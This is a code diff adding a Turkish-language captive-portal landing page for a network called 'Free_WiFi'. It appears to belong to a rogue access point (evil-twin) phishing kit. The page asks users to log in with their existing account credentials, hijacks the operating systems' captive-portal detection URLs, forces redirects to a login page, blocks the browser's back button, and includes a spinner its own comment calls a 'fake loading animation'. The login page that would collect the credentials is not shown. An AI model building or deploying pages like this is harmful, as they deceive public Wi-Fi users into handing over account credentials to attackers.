@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wi-Fi Erişimi - Giriş Gerekli</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="icon" type="image/x-icon" href="data:image/x-icon;base64,">
+    
+    <!-- Captive Portal Meta Tags -->
+    <meta http-equiv="refresh" content="0; url=login.html">
+    <meta name="robots" content="noindex, nofollow">
+    
+    <!-- Mobile Optimization -->
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no">
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="wifi-icon">
+                <svg width="60" height="60" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M1 9L12 20L23 9C18.5 4.5 5.5 4.5 1 9Z" stroke="#4CAF50" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                    <path d="M5 13L12 20L19 13C16.5 10.5 7.5 10.5 5 13Z" stroke="#4CAF50" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                    <path d="M9 17L12 20L15 17C13.5 15.5 10.5 15.5 9 17Z" stroke="#4CAF50" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                </svg>
+            </div>
+            <h1>Wi-Fi Ağına Hoş Geldiniz</h1>
+            <p class="subtitle">İnternet erişimi için giriş yapmanız gerekmektedir</p>
+        </div>
+
+        <div class="content">
+            <div class="info-box">
+                <h2>🌐 Ücretsiz Wi-Fi Erişimi</h2>
+                <p>Bu ağa bağlanarak aşağıdaki hizmetlerden yararlanabilirsiniz:</p>
+                <ul>
+                    <li>✅ Yüksek hızlı internet erişimi</li>
+                    <li>✅ Sosyal medya platformları</li>
+                    <li>✅ Video streaming servisleri</li>
+                    <li>✅ Online alışveriş</li>
+                    <li>✅ E-posta ve mesajlaşma</li>
+                </ul>
+            </div>
+
+            <div class="login-prompt">
+                <h3>🔐 Güvenli Giriş</h3>
+                <p>Ağ güvenliği için kimlik doğrulaması gereklidir. Lütfen mevcut hesap bilgilerinizle giriş yapın.</p>
+                
+                <div class="login-options">
+                    <a href="login.html" class="btn btn-primary">
+                        <span class="btn-icon">🔑</span>
+                        Giriş Yap
+                    </a>
+                </div>
+            </div>
+
+            <div class="network-info">
+                <h3>📡 Ağ Bilgileri</h3>
+                <div class="info-grid">
+                    <div class="info-item">
+                        <span class="label">Ağ Adı:</span>
+                        <span class="value" id="network-name">Free_WiFi</span>
+                    </div>
+                    <div class="info-item">
+                        <span class="label">Sinyal Gücü:</span>
+                        <span class="value">Mükemmel</span>
+                    </div>
+                    <div class="info-item">
+                        <span class="label">Güvenlik:</span>
+                        <span class="value">WPA2 Korumalı</span>
+                    </div>
+                    <div class="info-item">
+                        <span class="label">Bağlantı Hızı:</span>
+                        <span class="value">100 Mbps</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="terms-section">
+                <h3>📋 Kullanım Koşulları</h3>
+                <div class="terms-content">
+                    <p>Bu Wi-Fi ağını kullanarak aşağıdaki koşulları kabul etmiş olursunuz:</p>
+                    <ul>
+                        <li>Ağı yalnızca yasal amaçlar için kullanacaksınız</li>
+                        <li>Zararlı yazılım indirmeyecek ve yaymayacaksınız</li>
+                        <li>Diğer kullanıcıların haklarına saygı göstereceksiniz</li>
+                        <li>Ağ kaynaklarını adil şekilde kullanacaksınız</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <div class="footer">
+            <div class="support-info">
+                <h4>🆘 Destek</h4>
+                <p>Bağlantı sorunu yaşıyorsanız:</p>
+                <ul>
+                    <li>Wi-Fi'yi kapatıp açmayı deneyin</li>
+                    <li>Tarayıcınızı yenileyin</li>
+                    <li>Cihazınızı yeniden başlatın</li>
+                </ul>
+            </div>
+            
+            <div class="security-notice">
+                <p class="warning">⚠️ Güvenlik Uyarısı: Kişisel bilgilerinizi korumak için güvenilir web sitelerini ziyaret edin ve hassas işlemlerinizi güvenli ağlarda gerçekleştirin.</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Auto-redirect script -->
+    <script>
+        // Otomatik yönlendirme (3 saniye sonra)
+        setTimeout(function() {
+            if (!window.location.href.includes('login.html')) {
+                window.location.href = 'login.html';
+            }
+        }, 3000);
+
+        // Ağ adını dinamik olarak güncelle
+        document.addEventListener('DOMContentLoaded', function() {
+            // URL parametrelerinden SSID'yi al
+            const urlParams = new URLSearchParams(window.location.search);
+            const ssid = urlParams.get('ssid') || 'Free_WiFi';
+            document.getElementById('network-name').textContent = ssid;
+            
+            // Sayfa başlığını güncelle
+            document.title = ssid + ' - Wi-Fi Erişimi';
+        });
+
+        // Captive portal detection için yaygın URL'leri yakala
+        const captiveUrls = [
+            'captive.apple.com',
+            'connectivitycheck.gstatic.com',
+            'detectportal.firefox.com',
+            'msftconnecttest.com',
+            'nmcheck.gnome.org'
+        ];
+
+        // Eğer captive portal testi yapılıyorsa direkt login sayfasına yönlendir
+        if (captiveUrls.some(url => window.location.href.includes(url))) {
+            window.location.href = 'login.html';
+        }
+
+        // Geri butonunu engelle
+        history.pushState(null, null, location.href);
+        window.onpopstate = function () {
+            history.go(1);
+        };
+    </script>
+
+    <!-- Captive Portal Detection -->
+    <script>
+        // Apple Captive Portal Detection
+        if (navigator.userAgent.includes('CaptiveNetworkSupport')) {
+            window.location.href = 'login.html';
+        }
+
+        // Android Captive Portal Detection
+        if (window.location.href.includes('generate_204')) {
+            window.location.href = 'login.html';
+        }
+
+        // Windows Captive Portal Detection
+        if (window.location.href.includes('msftconnecttest')) {
+            window.location.href = 'login.html';
+        }
+    </script>
+
+    <!-- Fake loading animation -->
+    <div id="loading-overlay" style="display: none;">
+        <div class="loading-spinner">
+            <div class="spinner"></div>
+            <p>Ağ bağlantısı kontrol ediliyor...</p>
+        </div>
+    </div>
+
+    <style>
+        #loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            z-index: 9999;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .loading-spinner {
+            text-align: center;
+            color: white;
+        }
+
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #4CAF50;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</body>
+</html>
